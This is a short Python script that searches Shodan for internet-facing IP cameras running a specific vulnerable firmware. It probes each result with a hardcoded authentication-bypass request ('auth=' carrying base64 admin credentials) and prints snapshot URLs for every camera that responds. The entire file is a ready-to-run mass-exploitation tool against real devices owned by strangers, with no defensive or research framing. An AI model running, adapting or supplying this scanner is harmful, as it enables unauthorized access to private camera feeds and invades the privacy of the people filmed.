#Required libs: requests and shodan.
import requests
import shodan
#'''"Server: App-webs/" "Content-Length: 1862"'''
import os

# Configuration
API_KEY = "YOUR API KEY FROM SHODAN.IO"

dorks=['''3.1.3.150324''','''Server: App-webs/''','''Content-Length: 1862''']
       
exploitable=[]
list_of_links=[]
exploit_check="/Security/users?auth=YWRtaW46MTEK"
get_snapshot="/onvif-http/snapshot?auth=YWRtaW46MTEK"

api = shodan.Shodan(API_KEY)

for dork in dorks:
        result = api.search(dork)

        for service in result['matches']:
                ipx=service['ip_str']
                portx=service['port']
                if portx == "80":
                        full=f"http://{ipx}"
                        list_of_links.append(full)
                elif portx == "443":
                        full=f"https://{ipx}"
                        list_of_links.append(full)
                else:
                        full=f"http://{ipx}:{portx}"
                        list_of_links.append(full)

        for link in list_of_links:
                try:
                        x=requests.get(f'{link}{exploit_check}',timeout=3)
                        if x.status_code == 200:
                                print(f"[+] Hit! {link}{get_snapshot}")
                                exploitable.append(f'{link}{get_snapshot}')
                except Exception:
                        print(f"[-] Timed out ({ipx})")
                        pass
for xddd in exploitable:
        print(xddd)

print("Done!")
